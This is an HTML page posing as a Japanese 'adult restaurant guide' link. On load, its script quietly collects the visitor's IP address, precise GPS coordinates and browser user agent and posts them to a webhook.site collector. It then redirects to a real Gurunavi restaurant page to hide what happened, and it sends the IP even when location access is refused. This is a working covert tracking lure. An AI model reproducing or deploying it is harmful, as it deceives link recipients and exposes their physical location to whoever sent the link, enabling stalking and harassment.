<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>大人のレストランガイド</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: 'MS Mincho', 'YuMincho', serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
    </style>
</head>
<body>
    <div>大人のレストランガイド</div>
    <script>
        // Webhook.siteのユニークURL
        const WEBHOOK_URL = 'https://webhook.site/c826cdd2-97b6-4edf-948f-6c0e07c6aaf5';

        // IPアドレスを取得
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                console.log('IP取得成功:', data.ip);
                return data.ip;
            } catch (error) {
                console.error('IP取得エラー:', error);
                return '不明';
            }
        }

        // 位置情報を取得して処理
        async function recordLocation() {
            const ip = await getIP();
            const userAgent = navigator.userAgent;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const data = {
                            ip: ip,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            userAgent: userAgent,
                            timestamp: new Date().toISOString()
                        };
                        await sendToWebhook(data);
                        window.location.href = 'https://r.gnavi.co.jp/business-dinner/aichi/areal4102/kods00066/';
                    },
                    async (error) => {
                        const data = {
                            ip: ip,
                            latitude: '拒否',
                            longitude: '拒否',
                            userAgent: userAgent,
                            timestamp: new Date().toISOString()
                        };
                        await sendToWebhook(data);
                        alert('位置情報サービスがオフになっています');
                    },
                    {
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                const data = {
                    ip: ip,
                    latitude: '非対応',
                    longitude: '非対応',
                    userAgent: userAgent,
                    timestamp: new Date().toISOString()
                };
                await sendToWebhook(data);
                alert('お使いのブラウザは位置情報APIをサポートしていません');
            }
        }

        // Webhook.siteにデータを送信
        async function sendToWebhook(data) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                console.log('データ送信成功');
            } catch (error) {
                console.error('送信エラー:', error);
            }
        }

        // ページ読み込み時に実行
        recordLocation();
    </script>
</body>
</html>
